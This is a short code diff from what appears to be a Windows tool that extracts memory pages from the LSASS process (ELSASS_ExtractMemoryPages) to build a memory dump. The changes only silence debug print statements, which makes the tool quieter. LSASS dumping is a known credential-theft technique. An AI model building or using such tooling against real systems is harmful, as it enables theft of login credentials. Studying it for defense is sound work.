@@ -29,7 +29,7 @@ PDumpMemoryDescriptor64 get_memory_ranges(PDUMPCONTEXT dc, IN PMODULEINFO module
     DWORD number_of_ranges = 0;
     NTSTATUS status;
 
-    printf("[EXTRACTOR] Getting memory ranges to dump\n");
+    //printf("[DEBUG] Getting memory ranges to dump\n");
 
     while (TRUE)
     {
@@ -68,7 +68,6 @@ PDumpMemoryDescriptor64 get_memory_ranges(PDUMPCONTEXT dc, IN PMODULEINFO module
         new_range = (PDumpMemoryDescriptor64)HeapAlloc(GetProcessHeap(), 0x00000008, sizeof(DumpMemoryDescriptor64));
         if (!new_range)
         {
-            printf("Failed to get memory ranges to dump\n");
             return NULL;
         }
         new_range->next = NULL;
@@ -94,7 +93,7 @@ PDumpMemoryDescriptor64 get_memory_ranges(PDUMPCONTEXT dc, IN PMODULEINFO module
     if (!ranges_list)
         return (NULL);
 
-    printf("[EXTRACTOR] Enumearted %ld ranges of memory\n", number_of_ranges);
+    //printf("[DEBUG] Enumerated %ld ranges of memory\n", number_of_ranges);
     return ranges_list;
 }
 
@@ -105,7 +104,7 @@ PDumpMemoryDescriptor64 ELSASS_ExtractMemoryPages(PDUMPCONTEXT dc, PMODULEINFO m
     NTSTATUS status;
     int i;
 
-    printf("[EXTRACTOR] Extracting memory pages\n");
+    //printf("[DEBUG] Extracting memory pages\n");
 
     memory_ranges = get_memory_ranges(dc, module_list);
     if (!memory_ranges)
